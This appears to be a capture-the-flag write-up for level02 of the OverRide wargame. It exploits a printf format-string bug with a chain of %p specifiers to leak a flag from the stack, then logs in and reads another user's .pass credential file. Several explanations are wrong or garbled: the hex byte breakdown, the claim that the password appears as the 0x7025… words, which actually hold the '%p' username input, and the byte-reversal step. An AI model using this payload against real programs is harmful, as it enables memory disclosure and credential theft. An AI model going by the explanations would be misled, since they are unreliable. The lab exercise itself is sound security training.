# Format Strings Vulnerability

The program uses `printf()` function without proper formating, which means we can leak the content of the stack.

The pattern of `%p`'s is used to dump the stack and get the values of memory addresses, and the password 'AAA1BBB2CCC3' as s marker reference.

In the code, the user passwrod which is the dump pass is allocated before the flag password, meaning wherever the location of the dump password, the flag is just right before it in the stack.

How dump password works?

0x3242424231414141

41 hexa of 'A'
31 hexa of '1'
42 hexa of 'B'
32 hexa of '2'
42 hexa of 'B'
32 hexa of '2'
42 hexa of 'B'
31 hexa of '1'

which is AAA1BBB2, it should be reversed due to little endian byte ordering that stores the addresses in right-to-left byte-by-byte. 

Meaning the result is 1AAA2BBB, and 0x33434343:

43 = ASCII 'C'
33 = ASCII '3'

Reading reversed: 3CCC
Combined: 1AAA2BBB3CCC → which matches parts of the input AAA1BBB2CCC3!

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: AAA1BBB2CCC3
*****************************************
0x7fffffffe4d0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 0x3242424231414141 0x33434343 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 does not have access!
```

The inserted password 'AAA1BBB2CCC3' is represented in the stack as:
[0x7025207025207025 0x2520702520702520 0x2070252070252070]

Then automatically the flag value comes just after it, which is:
[0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d].

Putting the output in order together and reversing it from little endian format, using an automated script that reverses each 64 bit value, '75 6e' becomes '75 6e 75', then retreving the ASCCI value of each, to get this password: **'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'**

The command to get into the shell using the flag is:

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: admin
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, admin!
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```